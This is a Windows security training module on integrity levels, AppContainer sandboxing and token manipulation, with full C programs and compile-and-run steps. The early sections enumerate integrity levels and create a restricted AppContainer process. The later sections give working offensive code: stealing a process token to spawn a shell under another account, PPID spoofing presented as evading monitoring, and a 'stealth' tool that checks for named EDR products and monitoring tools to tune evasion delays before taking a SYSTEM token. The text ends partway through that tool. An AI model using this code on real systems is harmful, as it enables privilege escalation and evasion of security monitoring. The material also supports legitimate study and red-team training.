## Day 4: Sandbox, Integrity Level, and AppContainer

- **Goal**: Understand Windows sandboxing mechanisms - integrity levels, AppContainers, process attributes, and token-based restrictions.
- **Activities**:
  - _Reading_:
    - [Microsoft - Mandatory Integrity Control](https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control)
    - [Microsoft - AppContainer Isolation](https://learn.microsoft.com/en-us/windows/win32/secauthz/appcontainer-isolation)
    - [James Forshaw - Windows Security Internals](https://nostarch.com/windows-security-internals)
  - _Online Resources_:
    - [Chromium Sandbox Architecture](https://chromium.googlesource.com/chromium/src/+show/HEAD/docs/design/sandbox.md) - Real-world sandbox implementation
  - _Tool Setup_:
    - Process Explorer / Process Hacker (token inspection)
    - NtObjectManager PowerShell module (James Forshaw)
    - AccessChk (Sysinternals)
    - TokenViewer (from NtObjectManager)
  - _Exercise_:
    - Enumerate integrity levels of running processes
    - Create an AppContainer process and test its restrictions
    - Manipulate tokens to escalate privileges
    - Exploit process attribute inheritance for sandbox escape

Windows uses multiple layers of process isolation beyond the traditional user/admin boundary. This day teaches you to **understand and defeat** these isolation mechanisms.

### Context: Why Sandbox Bypass Matters

- **Browser exploitation**: Chrome/Edge renderer runs in AppContainer - need to escape it
- **Windows Store apps**: UWP apps run sandboxed - malware must break out
- **Integrity levels**: Low-IL processes can't write to Medium-IL objects - affects post-exploitation
- **Red team operations**: Understanding token manipulation is critical for lateral movement

### Deliverables

- [ ] Understand Windows integrity levels (Untrusted, Low, Medium, High, System)
- [ ] Analyze AppContainer capabilities and restrictions
- [ ] Implement token manipulation for privilege escalation
- [ ] Study process attribute exploitation techniques

### Windows Integrity Levels Deep Dive

```text
┌─────────────────────────────────────────────────────────────────┐
│               Windows Integrity Level Architecture              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  INTEGRITY LEVELS (Mandatory Labels):                           │
│  ─────────────────────────────────────                          │
│  System    (S-1-16-16384)  │ Services, kernel-mode              │
│  High      (S-1-16-12288)  │ Elevated admin processes           │
│  Medium    (S-1-16-8192)   │ Standard user processes            │
│  Low       (S-1-16-4096)   │ Browser renderers, temp folders    │
│  Untrusted (S-1-16-0)      │ Most restricted                    │
│                                                                 │
│  MANDATORY POLICY:                                              │
│  ─────────────────                                              │
│  No-Write-Up:   Lower IL cannot write to higher IL objects      │
│  No-Read-Up:    Lower IL cannot read higher IL objects          │
│  No-Execute-Up: Lower IL cannot execute higher IL binaries      │
│                                                                 │
│  DEFAULT POLICY: No-Write-Up only                               │
│  -> A Low-IL process CAN read Medium-IL files by default!       │
│                                                                 │
│  ATTACK IMPLICATIONS:                                           │
│  ─────────────────────                                          │
│  Low IL -> Medium IL:                                           │
│  ├── Can read files, registry (unless explicitly labeled)       │
│  ├── Cannot write to Medium-IL system locations (Windows, PF)   │
│  ├── CAN write to own user files (owner rights override IL)     │
│  ├── Can write to %LOCALAPPDATA%\Low, %TEMP%\Low                │
│  ├── Can communicate via COM, shared memory                     │
│  └── Can exploit higher-IL services listening on interfaces     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Integrity Level Enumeration

```c
// integrity_level_tool.c - Enumerate integrity levels
// Compile: cl src\integrity_level_tool.c  /Fe:bin\integrity_level_tool.exe advapi32.lib

#include <windows.h>
#include <sddl.h>
#include <stdio.h>
#include <errno.h>

// Well-known integrity level SIDs
#define INTEGRITY_UNTRUSTED_SID  "S-1-16-0"
#define INTEGRITY_LOW_SID        "S-1-16-4096"
#define INTEGRITY_MEDIUM_SID     "S-1-16-8192"
#define INTEGRITY_HIGH_SID       "S-1-16-12288"
#define INTEGRITY_SYSTEM_SID     "S-1-16-16384"

const char* GetIntegrityLevelName(DWORD level) {
    switch (level) {
        case 0x0000: return "Untrusted";
        case 0x1000: return "Low";
        case 0x2000: return "Medium";
        case 0x2100: return "Medium Plus";
        case 0x3000: return "High";
        case 0x4000: return "System";
        case 0x5000: return "Protected Process";
        default:     return "Unknown";
    }
}

void GetProcessIntegrityLevel(HANDLE hProcess) {
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken failed: %d\n", GetLastError());
        return;
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize);

    PTOKEN_MANDATORY_LABEL pLabel = (PTOKEN_MANDATORY_LABEL)malloc(dwSize);
    if (GetTokenInformation(hToken, TokenIntegrityLevel, pLabel, dwSize, &dwSize)) {
        DWORD integrityLevel = *GetSidSubAuthority(
            pLabel->Label.Sid,
            (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pLabel->Label.Sid) - 1)
        );

        printf("[+] Integrity Level: %s (0x%04X)\n",
               GetIntegrityLevelName(integrityLevel), integrityLevel);

        // Show the SID
        LPSTR sidString = NULL;
        ConvertSidToStringSidA(pLabel->Label.Sid, &sidString);
        printf("    SID: %s\n", sidString);
        LocalFree(sidString);
    }

    free(pLabel);
    CloseHandle(hToken);
}

BOOL TestIntegrityRestrictions(const char* label) {
    printf("\n[*] Testing %s Integrity Level restrictions:\n", label);

    // Test 1: Write to user profile
    printf("    [TEST] Write to %%USERPROFILE%%\\il_test.txt: ");
    FILE* f = fopen("C:\\Users\\dev\\il_test.txt", "w");
    if (f) {
        fprintf(f, "test from %s IL\n", label);
        fclose(f);
        printf("SUCCESS\n");
    } else {
        printf("FAILED (errno: %d)\n", errno);
    }

    // Test 2: Write to registry
    printf("    [TEST] Write to HKCU\\Software\\ILTest: ");
    HKEY hKey;
    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\ILTest", 0, NULL,
                                   REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (result == ERROR_SUCCESS) {
        RegSetValueExA(hKey, label, 0, REG_SZ, (BYTE*)label, strlen(label) + 1);
        RegCloseKey(hKey);
        printf("SUCCESS\n");
    } else {
        printf("FAILED (error: %ld)\n", result);
    }

    // Test 3: Write to system location
    printf("    [TEST] Write to C:\\Windows\\il_test.txt: ");
    f = fopen("C:\\Windows\\il_test.txt", "w");
    if (f) {
        fprintf(f, "test\n");
        fclose(f);
        printf("SUCCESS\n");
    } else {
        printf("FAILED (errno: %d)\n", errno);
    }

    // Test 4: Read from user profile
    printf("    [TEST] Read from %%USERPROFILE%%\\Desktop\\desktop.ini: ");
    f = fopen("C:\\Users\\dev\\Desktop\\desktop.ini", "r");
    if (f) {
        fclose(f);
        printf("SUCCESS\n");
    } else {
        printf("FAILED (errno: %d)\n", errno);
    }

    return TRUE;
}

BOOL SpawnLowIntegrityProcess(const char* cmdLine) {
    printf("[*] Spawning Low-IL process: %s\n", cmdLine);

    HANDLE hToken, hNewToken;
    PSID pLowSid = NULL;

    // Get current process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY |
                          TOKEN_ADJUST_DEFAULT | TOKEN_ASSIGN_PRIMARY, &hToken)) {
        printf("[-] OpenProcessToken failed\n");
        return FALSE;
    }

    // Duplicate token with all access rights
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
                          TokenPrimary, &hNewToken)) {
        printf("[-] DuplicateTokenEx failed: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    // Create Low integrity SID
    ConvertStringSidToSidA(INTEGRITY_LOW_SID, &pLowSid);

    // Set token integrity level to Low
    TOKEN_MANDATORY_LABEL label = {0};
    label.Label.Attributes = SE_GROUP_INTEGRITY;
    label.Label.Sid = pLowSid;

    if (!SetTokenInformation(hNewToken, TokenIntegrityLevel,
                             &label, sizeof(label) + GetLengthSid(pLowSid))) {
        printf("[-] SetTokenInformation failed\n");
        LocalFree(pLowSid);
        CloseHandle(hNewToken);
        CloseHandle(hToken);
        return FALSE;
    }

    // Create process with low integrity token
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    char cmdBuf[MAX_PATH];
    strcpy(cmdBuf, cmdLine);

    if (CreateProcessAsUserA(hNewToken, NULL, cmdBuf, NULL, NULL,
                              FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[+] Low-IL process created, PID: %d\n", pi.dwProcessId);

        // Wait for process to complete
        WaitForSingleObject(pi.hProcess, INFINITE);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcessAsUser failed: %d\n", GetLastError());
    }

    LocalFree(pLowSid);
    CloseHandle(hNewToken);
    CloseHandle(hToken);
    return TRUE;
}

int main() {
    // Check if we're being called for Low-IL test
    if (__argc > 1 && strcmp(__argv[1], "--low-il-test") == 0) {
        printf("\n[*] Running in Low-IL child process:\n");
        GetProcessIntegrityLevel(GetCurrentProcess());
        TestIntegrityRestrictions("Low");
        return 0;
    }

    printf("=== Integrity Level Analysis Tool ===\n\n");

    printf("[*] Current process:\n");
    GetProcessIntegrityLevel(GetCurrentProcess());

    // Test at Medium IL
    TestIntegrityRestrictions("Medium");

    printf("\n[*] Now testing at Low IL...\n");

    // Create a temporary test program that runs the same tests
    char testCmd[512];
    sprintf(testCmd, "\"%s\" --low-il-test", __argv[0]);

    SpawnLowIntegrityProcess(testCmd);

    printf("\n=== Summary ===\n");
    printf("Medium IL: Can write to user profile and registry\n");
    printf("Low IL:    Cannot write to Medium-IL user locations\n");
    printf("Both:      Cannot write to system locations (need elevation)\n");

    return 0;
}
```

**Compile and Run**

```bash
cd c:\Windows_Mitigations_Lab>
cl src\integrity_level_tool.c  /Fe:bin\integrity_level_tool.exe advapi32.lib
.\bin\integrity_level_tool.exe
```

### AppContainer Analysis

```c
// appcontainer_analysis.c - Analyze and test AppContainer isolation
// Compile: cl src\appcontainer_analysis.c  /Fe:bin\appcontainer_analysis.exe advapi32.lib userenv.lib ole32.lib

#include <windows.h>
#include <userenv.h>
#include <sddl.h>
#include <stdio.h>

/*
AppContainer Isolation:
═══════════════════════

AppContainer is a stronger sandbox than integrity levels.
Used by: Edge/Chrome renderers, Windows Store apps, sandboxed services.

Key restrictions:
- Processes get a unique AppContainer SID
- Cannot access most user resources by default
- Network access requires explicit capabilities
- File access limited to package-specific folders
- Registry access heavily restricted
- Cannot communicate freely with other processes

AppContainer capabilities:
- internetClient           - Outbound internet
- internetClientServer     - Internet + listen
- privateNetworkClientServer - LAN access
- documentsLibrary        - User documents
- picturesLibrary         - User pictures
- videosLibrary           - User videos
- removableStorage        - USB drives
- enterpriseAuthentication - Domain auth

ESCAPE VECTORS:
- Broker process exploitation (most common)
- Capability escalation via COM
- Kernel vulnerabilities (bypass all usermode sandboxing)
- Named object namespace leaks
- Shared section exploitation
*/

void EnumerateAppContainerProcesses() {
    printf("=== AppContainer Process Enumeration ===\n\n");

    printf("[*] To enumerate AppContainer processes:\n");
    printf("    Get-Process | ForEach-Object {\n");
    printf("        $token = (Get-NtToken -ProcessId $_.Id -Access Query);\n");
    printf("        if ($token.AppContainer) {\n");
    printf("            Write-Host \"$($_.Name) [PID: $($_.Id)] - AC: $($token.AppContainerSid)\"\n");
    printf("        }\n");
    printf("    }\n\n");

    printf("[*] Common AppContainer processes:\n");
    printf("    - msedge.exe (renderer)   - Edge browser tabs\n");
    printf("    - chrome.exe (renderer)   - Chrome browser tabs\n");
    printf("    - RuntimeBroker.exe       - UWP app broker\n");
    printf("    - SearchUI.exe            - Windows Search\n");
    printf("    - WindowsTerminal.exe     - Modern terminal\n");
}

BOOL CreateAppContainerProcess(const char* appName) {
    printf("\n[*] Creating AppContainer process: %s\n", appName);

    PSID pAppContainerSid = NULL;
    HRESULT hr;

    // Create AppContainer profile
    LPCWSTR containerName = L"TestAppContainer";
    LPCWSTR displayName = L"Test AppContainer";
    LPCWSTR description = L"Testing AppContainer isolation";

    hr = CreateAppContainerProfile(containerName, displayName,
                                    description, NULL, 0, &pAppContainerSid);

    if (FAILED(hr)) {
        if (hr == HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS)) {
            printf("[*] AppContainer profile already exists, deriving SID\n");
            hr = DeriveAppContainerSidFromAppContainerName(containerName,
                                                            &pAppContainerSid);
        }
        if (FAILED(hr)) {
            printf("[-] Failed to create/derive AppContainer: 0x%lX\n", hr);
            return FALSE;
        }
    }

    // Print AppContainer SID
    LPWSTR sidString;
    ConvertSidToStringSidW(pAppContainerSid, &sidString);
    wprintf(L"[+] AppContainer SID: %s\n", sidString);
    LocalFree(sidString);

    // Set up security capabilities
    SECURITY_CAPABILITIES secCaps = {0};
    secCaps.AppContainerSid = pAppContainerSid;
    secCaps.CapabilityCount = 0;  // No capabilities = maximum restriction
    secCaps.Capabilities = NULL;

    // Create process in AppContainer
    STARTUPINFOEXW siEx = {0};
    siEx.StartupInfo.cb = sizeof(siEx);

    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    siEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attrSize);
    InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, &attrSize);

    UpdateProcThreadAttribute(siEx.lpAttributeList, 0,
                              PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES,
                              &secCaps, sizeof(secCaps), NULL, NULL);

    PROCESS_INFORMATION pi = {0};
    WCHAR cmdLine[] = L"cmd.exe /k echo Running in AppContainer";

    if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE,
                       EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
                       NULL, NULL, &siEx.StartupInfo, &pi)) {
        printf("[+] AppContainer process created, PID: %d\n", pi.dwProcessId);
        printf("[*] Try accessing user files from that cmd.exe\n");
        printf("[*] Try: type %%USERPROFILE%%\\Desktop\\test.txt\n");
        printf("[*] Expected: Access denied\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcess failed: %d\n", GetLastError());
    }

    DeleteProcThreadAttributeList(siEx.lpAttributeList);
    free(siEx.lpAttributeList);
    FreeSid(pAppContainerSid);

    return TRUE;
}

void ExplainEscapeVectors() {
    printf("\n=== AppContainer Escape Vectors ===\n\n");

    printf("[1] BROKER PROCESS EXPLOITATION\n");
    printf("-------------------------------\n");
    printf("AppContainer processes communicate with broker via IPC.\n");
    printf("Broker runs at Medium IL with more access.\n");
    printf("Exploit: Find vulnerability in broker's IPC handling.\n");
    printf("Example: Chrome's Mojo IPC, Edge's RuntimeBroker\n\n");

    printf("[2] COM OBJECT ABUSE\n");
    printf("--------------------\n");
    printf("Some COM objects are accessible from AppContainer.\n");
    printf("If a COM object has excessive functionality:\n");
    printf("  - File access via IShellItem\n");
    printf("  - Registry access via specific interfaces\n");
    printf("  - Network via COM-based protocols\n\n");

    printf("[3] NAMED OBJECT NAMESPACE LEAKS\n");
    printf("--------------------------------\n");
    printf("AppContainers have their own object namespace.\n");
    printf("But some objects may be shared globally:\n");
    printf("  - Shared memory sections\n");
    printf("  - Events, mutexes with weak DACLs\n");
    printf("  - Named pipes accessible to AC\n\n");

    printf("[4] PROCESS ATTRIBUTE MANIPULATION\n");
    printf("----------------------------------\n");
    printf("PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES sets AC.\n");
    printf("If parent process can be influenced:\n");
    printf("  - Spawn child without AC attribute\n");
    printf("  - Inherit less-restricted token\n");
    printf("  - Exploit token assignment logic\n\n");

    printf("[5] KERNEL VULNERABILITY\n");
    printf("------------------------\n");
    printf("AppContainer is enforced by the kernel security reference monitor.\n");
    printf("Kernel exploit = bypass ALL usermode sandboxing.\n");
    printf("This is why kernel bugs are so valuable for browser exploit chains.\n");
}

int main() {
    EnumerateAppContainerProcesses();
    CreateAppContainerProcess("cmd.exe");
    ExplainEscapeVectors();

    return 0;
}
```

**Compile and Run**

```bash
cd c:\Windows_Mitigations_Lab>
cl src\appcontainer_analysis.c  /Fe:bin\appcontainer_analysis.exe advapi32.lib userenv.lib ole32.lib
.\bin\appcontainer_analysis.exe
```

### Comparison: Integrity Levels vs AppContainer

```text
┌────────────────────────────────────────────────────────────────────┐
│         Windows Sandbox Mechanisms: IL vs AppContainer             │
├────────────────────────────────────────────────────────────────────┤
│                                                                    │
│  Operation              │ Medium IL │ Low IL    │ AppContainer     │
│  ──────────────────────────────────────────────────────────────────│
│  Read user files        │ YES       │ YES       │ NO (denied)      │
│  Write user files       │ YES       │ NO        │ NO (denied)      │
│  Write system files     │ NO*       │ NO        │ NO (denied)      │
│  Access registry HKCU   │ YES       │ YES (read)│ NO (denied)      │
│  Network access         │ YES       │ YES       │ NO (no caps)     │
│  Access current dir     │ YES       │ YES       │ NO (invalid)     │
│  IPC with other procs   │ YES       │ LIMITED   │ NO (isolated)    │
│                                                                    │
│  * Requires elevation (High IL)                                    │
│                                                                    │
│  KEY DIFFERENCES:                                                  │
│  ----------------                                                  │
│  Integrity Levels:                                                 │
│    - Enforces No-Write-Up policy (lower cannot write to higher)    │
│    - Read access preserved by default                              │
│    - Processes can still communicate via IPC                       │
│    - Used for: IE Protected Mode, sandboxed downloads              │
│                                                                    │
│  AppContainer:                                                     │
│    - Default deny for all resources                                │
│    - Requires explicit capabilities for any access                 │
│    - Isolated object namespace                                     │
│    - Used for: UWP apps, Edge/Chrome renderers, Store apps         │
│                                                                    │
│  SECURITY HIERARCHY (weakest to strongest):                        │
│    Medium IL > Low IL > AppContainer (no caps) > Kernel isolation  │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘
```

### Token Manipulation

```bash
cd c:\Windows_Mitigations_Lab

cl src\token_manipulation.c /Fe:bin\token_manipulation.exe advapi32.lib
tasklist | findstr cmd.exe
# use one of these pids and try both stealing and spoofing methods
.\bin\token_manipulation.exe

cl src\token_stealth.c /Fe:bin\token_stealth.exe /MT /O2 advapi32.lib
# run the following as admin:
.\token_stealth.exe
# a new cmd should be popped
whoami
#nt authority\system
whoami /groups | findstr "Label"
#Mandatory Label\System Mandatory Level Label            S-1-16-16384
whoami /priv
# PRIVILEGES INFORMATION
```

#### Stealing and Spoofing

```c
// token_manipulation.c
// Compile: cl src\token_manipulation.c /Fe:bin\token_manipulation.exe advapi32.lib

#include <windows.h>
#include <stdio.h>
#include <sddl.h>

void DumpTokenInfo(HANDLE hToken) {
    DWORD dwSize;

    // Get user SID
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    PTOKEN_USER pUser = (PTOKEN_USER)malloc(dwSize);
    if (GetTokenInformation(hToken, TokenUser, pUser, dwSize, &dwSize)) {
        LPSTR sidStr;
        ConvertSidToStringSidA(pUser->User.Sid, &sidStr);
        printf("  User SID: %s\n", sidStr);
        LocalFree(sidStr);
    }
    free(pUser);

    // Get privileges
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
    PTOKEN_PRIVILEGES pPrivs = (PTOKEN_PRIVILEGES)malloc(dwSize);
    if (GetTokenInformation(hToken, TokenPrivileges, pPrivs, dwSize, &dwSize)) {
        printf("  Privileges (%d):\n", pPrivs->PrivilegeCount);
        for (DWORD i = 0; i < pPrivs->PrivilegeCount && i < 10; i++) {
            char privName[256];
            DWORD nameSize = sizeof(privName);
            LookupPrivilegeNameA(NULL, &pPrivs->Privileges[i].Luid, privName, &nameSize);
            printf("    %s [%s]\n", privName,
                   (pPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) ? "ENABLED" : "DISABLED");
        }
        if (pPrivs->PrivilegeCount > 10) {
            printf("    ... and %d more\n", pPrivs->PrivilegeCount - 10);
        }
    }
    free(pPrivs);
}

BOOL EnablePrivilege(HANDLE hToken, LPCSTR privilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueA(NULL, privilege, &luid)) {
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
            printf("[-] Privilege %s not held by token\n", privilege);
            return FALSE;
        }
        printf("[+] Privilege %s enabled\n", privilege);
        return TRUE;
    }

    return FALSE;
}

BOOL StealTokenFromProcess(DWORD targetPID) {
    printf("\n[*] Attempting to steal token from PID %d\n", targetPID);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPID);
    if (!hProcess) {
        printf("[-] OpenProcess failed: %d\n", GetLastError());
        printf("    (Need SeDebugPrivilege or target must be same user)\n");
        return FALSE;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Opened token from PID %d\n", targetPID);
    printf("[*] Target token info:\n");
    DumpTokenInfo(hToken);

    // Duplicate the token
    HANDLE hDupToken = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
                          TokenPrimary, &hDupToken)) {
        printf("[-] DuplicateTokenEx failed: %d\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Token duplicated successfully\n");

    // Try to create process with stolen token
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    if (CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, NULL,
                                 L"cmd.exe /k echo Token stolen from PID && whoami",
                                 0, NULL, NULL, &si, &pi)) {
        printf("[+] Process created with stolen token, PID: %d\n", pi.dwProcessId);
        printf("[*] Check the new cmd.exe window - it runs with target's privileges\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcessWithTokenW failed: %d\n", GetLastError());
        printf("    (Need SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege)\n");
    }

    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return TRUE;
}

BOOL PPIDSpoofing(DWORD parentPID) {
    printf("\n[*] Attempting PPID spoofing with parent PID %d\n", parentPID);

    // Open parent process
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPID);
    if (!hParent) {
        printf("[-] OpenProcess failed: %d\n", GetLastError());
        printf("    (Need PROCESS_CREATE_PROCESS access to parent)\n");
        return FALSE;
    }

    printf("[+] Opened parent process handle\n");

    // Initialize attribute list
    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attrSize);

    if (!InitializeProcThreadAttributeList(pAttrList, 1, 0, &attrSize)) {
        printf("[-] InitializeProcThreadAttributeList failed: %d\n", GetLastError());
        CloseHandle(hParent);
        free(pAttrList);
        return FALSE;
    }

    // Set parent process attribute
    if (!UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                    &hParent, sizeof(HANDLE), NULL, NULL)) {
        printf("[-] UpdateProcThreadAttribute failed: %d\n", GetLastError());
        DeleteProcThreadAttributeList(pAttrList);
        CloseHandle(hParent);
        free(pAttrList);
        return FALSE;
    }

    printf("[+] Process attribute set to spoof parent\n");

    // Create process with spoofed PPID
    STARTUPINFOEXA siEx = {0};
    siEx.StartupInfo.cb = sizeof(siEx);
    siEx.lpAttributeList = pAttrList;

    PROCESS_INFORMATION pi = {0};
    char cmdLine[] = "cmd.exe /k echo PPID Spoofed! Check Process Explorer";

    if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                       EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
                       NULL, NULL, &siEx.StartupInfo, &pi)) {
        printf("[+] Process created with spoofed PPID: %d\n", pi.dwProcessId);
        printf("[*] Check Process Explorer - parent should show as PID %d\n", parentPID);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcess failed: %d\n", GetLastError());
    }

    DeleteProcThreadAttributeList(pAttrList);
    CloseHandle(hParent);
    free(pAttrList);
    return TRUE;
}

int main(int argc, char* argv[]) {
    // Dump current token
    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
    printf("=== Current Token ===\n");
    DumpTokenInfo(hToken);

    // Try enabling common offensive privileges
    printf("\n=== Enabling Privileges ===\n");
    EnablePrivilege(hToken, "SeDebugPrivilege");
    EnablePrivilege(hToken, "SeImpersonatePrivilege");
    EnablePrivilege(hToken, "SeAssignPrimaryTokenPrivilege");

    CloseHandle(hToken);

    // Interactive menu
    printf("\n=== Token Manipulation Techniques ===\n");
    printf("[1] Steal token from another process\n");
    printf("[2] PPID spoofing (fake parent process)\n");
    printf("[3] Exit\n");
    printf("\nSelect option: ");

    int choice;
    if (scanf("%d", &choice) != 1) {
        printf("Invalid input\n");
        return 1;
    }

    if (choice == 1) {
        printf("Enter target PID to steal token from: ");
        DWORD pid;
        if (scanf("%d", &pid) == 1) {
            StealTokenFromProcess(pid);
        }
    } else if (choice == 2) {
        printf("Enter parent PID to spoof: ");
        DWORD pid;
        if (scanf("%d", &pid) == 1) {
            PPIDSpoofing(pid);
        }
    }

    printf("\n=== Summary ===\n");
    printf("Token stealing: Requires SeDebugPrivilege or same-user access\n");
    printf("PPID spoofing: Requires PROCESS_CREATE_PROCESS on parent\n");
    printf("Both techniques bypass many security monitoring tools\n");

    return 0;
}
```

#### Token Theft from SYSTEM Process

```c
// token_stealth.c
// Compile: cl src\token_stealth.c /Fe:bin\token_stealth.exe /MT /O2 advapi32.lib
// REQUIRES: SeDebugPrivilege (run as admin)

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <psapi.h>
#include <sddl.h>

#pragma comment(lib, "advapi32.lib")

// OPSEC and stealth structures
typedef struct _OPSEC_CTX {
    BOOL is_edr_present;
    BOOL is_monitoring_active;
    DWORD stealth_level;
    DWORD delay_factor;
} OPSEC_CTX;

typedef struct _TARGET_PROCESS {
    DWORD pid;
    WCHAR name[256];
    DWORD session_id;
    BOOL is_critical;
    BOOL is_protected;
    double cpu_usage;
} TARGET_PROCESS;

// Global state
static OPSEC_CTX g_opsec = {0};
static TARGET_PROCESS g_targets[32];
static int g_target_count = 0;

BOOL DetectEDRPresence() {
    // Check for common EDR processes
    WCHAR* edr_processes[] = {
        L"crowdstrike.exe",
        L"csfalconservice.exe",
        L"sentinelagent.exe",
        L"cb.exe",
        L"carbonblack.exe",
        L"edrclient.exe",
        L"elasticendpoint.exe",
        L"mcafeeendpoint.exe",
        L"symantec.exe",
        L"taniumclient.exe"
    };

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    BOOL found_edr = FALSE;
    if (Process32FirstW(snapshot, &pe32)) {
        do {
            for (int i = 0; i < 10; i++) {
                if (_wcsicmp(pe32.szExeFile, edr_processes[i]) == 0) {
                    found_edr = TRUE;
                    break;
                }
            }
        } while (Process32NextW(snapshot, &pe32) && !found_edr);
    }

    CloseHandle(snapshot);

    // Check for EDR drivers
    WCHAR system32[MAX_PATH];
    GetSystemDirectoryW(system32, MAX_PATH);

    WCHAR* edr_drivers[] = {
        L"\\drivers\\CrowdStrike\\",
        L"\\drivers\\cb\\",
        L"\\drivers\\sentinel\\",
        L"\\drivers\\elastic\\"
    };

    for (int i = 0; i < 4; i++) {
        WCHAR driver_path[MAX_PATH];
        wcscpy_s(driver_path, MAX_PATH, system32);
        wcscat_s(driver_path, MAX_PATH, edr_drivers[i]);

        if (GetFileAttributesW(driver_path) != INVALID_FILE_ATTRIBUTES) {
            found_edr = TRUE;
            break;
        }
    }

    return found_edr;
}

BOOL CheckProcessMonitoring() {
    // Check for common monitoring tools
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    BOOL monitoring = FALSE;
    if (Process32FirstW(snapshot, &pe32)) {
        do {
            WCHAR* monitor_processes[] = {
                L"procmon.exe",
                L"processhacker.exe",
                L"procexp.exe",
                L"wireshark.exe",
                L"sysinternals.exe",
                L"taskmgr.exe"
            };

            for (int i = 0; i < 6; i++) {
                if (_wcsicmp(pe32.szExeFile, monitor_processes[i]) == 0) {
                    monitoring = TRUE;
                    break;
                }
            }
        } while (Process32NextW(snapshot, &pe32) && !monitoring);
    }

    CloseHandle(snapshot);
    return monitoring;
}

VOID InitializeOPSEC() {
    g_opsec.is_edr_present = DetectEDRPresence();
    g_opsec.is_monitoring_active = CheckProcessMonitoring();

    // Set stealth level based on environment
    if (g_opsec.is_edr_present) {
        g_opsec.stealth_level = 3;  // Maximum stealth
        g_opsec.delay_factor = 5000;  // 5 second delays
    } else if (g_opsec.is_monitoring_active) {
        g_opsec.stealth_level = 2;  // Medium stealth
        g_opsec.delay_factor = 2000;  // 2 second delays
    } else {
        g_opsec.stealth_level = 1;  // Minimal stealth
        g_opsec.delay_factor = 500;   // 0.5 second delays
    }

    printf("[*] OPSEC Assessment:\n");
    printf("    EDR Present: %s\n", g_opsec.is_edr_present ? "YES" : "NO");
    printf("    Monitoring Active: %s\n", g_opsec.is_monitoring_active ? "YES" : "NO");
    printf("    Stealth Level: %d\n", g_opsec.stealth_level);
    printf("    Delay Factor: %d ms\n\n", g_opsec.delay_factor);
}

